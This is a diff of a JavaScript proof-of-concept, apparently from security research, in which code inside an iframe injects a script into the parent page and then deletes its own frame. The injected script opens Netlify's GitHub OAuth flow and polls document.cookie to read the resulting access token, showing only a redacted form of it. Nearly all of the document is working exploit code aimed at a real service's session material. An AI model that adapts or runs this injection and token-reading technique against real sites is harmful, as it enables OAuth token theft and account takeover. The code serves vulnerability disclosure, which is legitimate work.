@@ -2,12 +2,10 @@
 (() => {
   try {
     const d = parent.document;
-    const script = d.createElement("script");
+    const installer = d.createElement("script");
 
     function parentPayload() {
-      if (window.__netlifyParentPoc?.destroy) {
-        window.__netlifyParentPoc.destroy();
-      }
+      const PANEL_ID = "oauth-parent-poc";
 
       const OAUTH_URL =
         "https://api.netlify.com/auth" +
@@ -22,12 +20,15 @@
         encodeURIComponent("https://www.netlify.com/") +
         "&use_redirect=true";
 
-      const ID = "netlify-parent-poc";
+      if (window.__oauthParentPoc?.destroy) {
+        window.__oauthParentPoc.destroy();
+      }
+
       let timer = null;
       let attempts = 0;
       let baselineCookie = "";
 
-      function readState() {
+      function readOAuthProof() {
         const match = document.cookie.match(
           /(?:^|;\s*)_initial_landing_page=([^;]*)/
         );
@@ -35,9 +36,8 @@
         if (!match) {
           return {
             cookieReadable: false,
-            tokenReadable: false,
             cookieValue: "",
-            token: ""
+            tokenReadable: false
           };
         }
 
@@ -51,30 +51,34 @@
           /(?:^|[?#&])access_token=([^&#]+)/
         );
 
+        if (!tokenMatch) {
+          return {
+            cookieReadable: true,
+            cookieValue,
+            tokenReadable: false
+          };
+        }
+
+        const token = tokenMatch[1];
+
         return {
           cookieReadable: true,
-          tokenReadable: Boolean(tokenMatch),
           cookieValue,
-          token: tokenMatch ? tokenMatch[1] : ""
+          tokenReadable: true,
+          tokenLength: token.length,
+          redactedToken:
+            token.length > 8
+              ? token.slice(0, 4) +
+                "…" +
+                token.slice(-4)
+              : "[readable]"
         };
       }
 
-      function redact(token) {
-        if (!token) return "not found";
-        if (token.length <= 8) return "[readable]";
-
-        return (
-          token.slice(0, 4) +
-          "…" +
-          token.slice(-4)
-        );
-      }
-
-      const old = document.getElementById(ID);
-      if (old) old.remove();
+      document.getElementById(PANEL_ID)?.remove();
 
       const panel = document.createElement("div");
-      panel.id = ID;
+      panel.id = PANEL_ID;
 
       panel.style.cssText = [
         "position:fixed",
@@ -84,10 +88,10 @@
         "flex-direction:column",
         "align-items:center",
         "justify-content:center",
-        "gap:18px",
+        "gap:20px",
         "padding:30px",
         "box-sizing:border-box",
-        "background:#fff",
+        "background:white",
         "color:#111",
         "font-family:system-ui,sans-serif",
         "text-align:center"
@@ -97,93 +101,110 @@
       title.textContent = "Parent-window OAuth PoC";
 
       const status = document.createElement("pre");
+
       status.style.cssText = [
+        "min-width:500px",
+        "padding:20px",
+        "border-radius:10px",
+        "background:#eee",
         "font:18px monospace",
         "line-height:1.5",
-        "padding:20px",
-        "background:#f1f1f1",
-        "border-radius:10px",
         "white-space:pre-wrap"
       ].join(";");
 
-      const start = document.createElement("button");
-      start.textContent = "Continue with GitHub";
-      start.style.cssText = [
+      const oauthButton = document.createElement("button");
+      oauthButton.textContent = "Continue with GitHub";
+
+      oauthButton.style.cssText = [
         "padding:16px 28px",
         "font-size:24px",
         "cursor:pointer"
       ].join(";");
 
-      const close = document.createElement("button");
-      close.textContent = "Close PoC";
-      close.style.cssText = [
+      const closeButton = document.createElement("button");
+      closeButton.textContent = "Close PoC";
+
+      closeButton.style.cssText = [
         "padding:10px 18px",
         "font-size:16px",
         "cursor:pointer"
       ].join(";");
 
-      function updateBeforeClick() {
-        const state = readState();
+      function showInitialState() {
+        const proof = readOAuthProof();
 
         status.textContent =
-          "Main realm: " + (window === top) + "\n" +
-          "Cookie readable before click: " +
-          state.cookieReadable + "\n" +
-          "Token readable before click: " +
-          state.tokenReadable;
+          "Executing in top window: " +
+          (window === top) +
+          "\nCookie readable before click: " +
+          proof.cookieReadable +
+          "\nToken readable before click: " +
+          proof.tokenReadable;
       }
 
-      function inspectAfterClick() {
+      function inspectAfterOAuth() {
         attempts++;
 
         try {
-          const state = readState();
+          const proof = readOAuthProof();
+
           const changed =
-            Boolean(state.cookieValue) &&
-            state.cookieValue !== baselineCookie;
+            Boolean(proof.cookieValue) &&
+            proof.cookieValue !== baselineCookie;
 
           status.textContent =
-            "Main realm: " + (window === top) + "\n" +
-            "Attempt: " + attempts + "\n" +
-            "Cookie readable: " +
-            state.cookieReadable + "\n" +
-            "Cookie changed after click: " +
-            changed + "\n" +
-            "Token readable: " +
-            state.tokenReadable;
+            "Executing in top window: " +
+            (window === top) +
+            "\nAttempt: " +
+            attempts +
+            "\nCookie readable: " +
+            proof.cookieReadable +
+            "\nCookie changed after click: " +
+            changed +
+            "\nToken readable: " +
+            proof.tokenReadable;
 
-          if (state.tokenReadable) {
-            clearTimeout(timer);
+          if (proof.tokenReadable) {
+            if (timer !== null) {
+              window.clearTimeout(timer);
+              timer = null;
+            }
 
             status.textContent +=
-              "\nToken length: " + state.token.length +
-              "\nRedacted token: " + redact(state.token) +
+              "\nToken length: " +
+              proof.tokenLength +
+              "\nRedacted token: " +
+              proof.redactedToken +
               "\n\nOAuth-token readability confirmed.";
 
             status.style.background = "#c8f7c5";
+            oauthButton.textContent =
+              "OAuth-token readability confirmed";
+
             document.documentElement.setAttribute(
               "data-oauth-token-readable",
               "true"
             );
 
-            window.__netlifyParentPoc.result = {
+            window.__oauthParentPoc.result = {
               cookieReadable: true,
               cookieChanged: changed,
               tokenReadable: true,
-              tokenLength: state.token.length,
-              redactedToken: redact(state.token)
+              tokenLength: proof.tokenLength,
+              redactedToken: proof.redactedToken
             };
 
             return;
           }
         } catch (error) {
           status.textContent =
-            "Inspection error: " + error.message;
+            "Cookie inspection error: " +
+            error.message;
         }
 
         if (attempts < 120) {
           timer = window.setTimeout(
-            inspectAfterClick,
+            inspectAfterOAuth,
             1000
           );
         } else {
@@ -192,91 +213,164 @@
         }
       }
 
-      start.addEventListener("click", function () {
-        const initial = readState();
+      oauthButton.addEventListener(
+        "click",
+        function () {
+          const initial = readOAuthProof();
 
-        baselineCookie = initial.cookieValue;
-        attempts = 0;
+          baselineCookie = initial.cookieValue;
+          attempts = 0;
+
+          document.documentElement.setAttribute(
+            "data-oauth-clicked",
+            "true"
+          );
+
+          status.style.background = "#fff3cd";
+          status.textContent =
+            "OAuth opened.\nWaiting for cookie state…";
+
+          window.open(
+            OAUTH_URL,
+            "_blank",
+            "noopener"
+          );
+
+          if (timer !== null) {
+            window.clearTimeout(timer);
+          }
+
+          timer = window.setTimeout(
+            inspectAfterOAuth,
+            1000
+          );
+        }
+      );
+
+      closeButton.addEventListener(
+        "click",
+        function () {
+          window.__oauthParentPoc.destroy();
+        }
+      );
+
+      panel.append(
+        title,
+        status,
+        oauthButton,
+        closeButton
+      );
+
+      function mount() {
+        document.body.appendChild(panel);
+
+        window.__oauthParentPoc = {
+          installed: true,
+          result: null,
+          inspect: readOAuthProof,
+
+          destroy() {
+            if (timer !== null) {
+              window.clearTimeout(timer);
+            }
+
+            document.getElementById(PANEL_ID)?.remove();
+
+            document.documentElement.removeAttribute(
+              "data-parent-poc-installed"
+            );
+
+            document.documentElement.removeAttribute(
+              "data-oauth-clicked"
+            );
+
+            document.documentElement.removeAttribute(
+              "data-oauth-token-readable"
+            );
+
+            delete window.__oauthParentPoc;
+          }
+        };
 
         document.documentElement.setAttribute(
-          "data-oauth-clicked",
+          "data-parent-poc-installed",
           "true"
         );
 
-        status.textContent =
-          "OAuth clicked.\nWaiting for completion…";
-
-        window.open(
-          OAUTH_URL,
-          "_blank",
-          "noopener"
-        );
-
-        clearTimeout(timer);
-        timer = window.setTimeout(
-          inspectAfterClick,
-          1000
-        );
-      });
-
-      close.addEventListener("click", function () {
-        window.__netlifyParentPoc.destroy();
-      });
-
-      panel.append(title, status, start, close);
+        showInitialState();
+      }
 
       if (document.body) {
-        document.body.appendChild(panel);
+        mount();
       } else {
         document.addEventListener(
           "DOMContentLoaded",
-          () => document.body.appendChild(panel),
+          mount,
           { once: true }
         );
       }
-
-      window.__netlifyParentPoc = {
-        installed: true,
-        result: null,
-
-        inspect: readState,
-
-        destroy() {
-          clearTimeout(timer);
-          document.getElementById(ID)?.remove();
-
-          document.documentElement.removeAttribute(
-            "data-parent-poc-installed"
-          );
-        }
-      };
-
-      document.documentElement.setAttribute(
-        "data-parent-poc-installed",
-        "true"
-      );
-
-      updateBeforeClick();
     }
 
     /*
-     * Convert the function to source and parse it again inside the
-     * parent document. Therefore its handlers and timers belong to
-     * the persistent parent realm.
+     * The browser reparses this source inside the parent document,
+     * making its handlers and timers parent-owned.
      */
-    script.textContent =
+    installer.textContent =
       "(" + parentPayload.toString() + ")();";
 
-    (d.head || d.documentElement).appendChild(script);
+    (d.head || d.documentElement).appendChild(
+      installer
+    );
 
-    const installed =
-      parent.__netlifyParentPoc?.installed === true;
+    installer.remove();
 
-    console.log("Parent PoC installed:", installed);
+    /*
+     * Remove the temporary frame only after parent installation.
+     */
+    let attempts = 0;
 
-    script.remove();
+    function cleanupWhenReady() {
+      attempts++;
+
+      try {
+        const ready =
+          d.documentElement.hasAttribute(
+            "data-parent-poc-installed"
+          );
+
+        if (ready) {
+          const frame = window.frameElement;
+
+          if (frame) {
+            frame.remove();
+          }
+
+          return;
+        }
+      } catch (error) {
+        console.error(
+          "Parent readiness check failed:",
+          error
+        );
+
+        return;
+      }
+
+      if (attempts < 100) {
+        window.setTimeout(cleanupWhenReady, 100);
+      } else {
+        console.error(
+          "Parent PoC installation timed out"
+        );
+      }
+    }
+
+    cleanupWhenReady();
   } catch (error) {
-    console.error("Parent PoC installation failed:", error);
+    console.error(
+      "Parent OAuth PoC failed:",
+      error
+    );
   }
 })();
 //({"counts":{}})
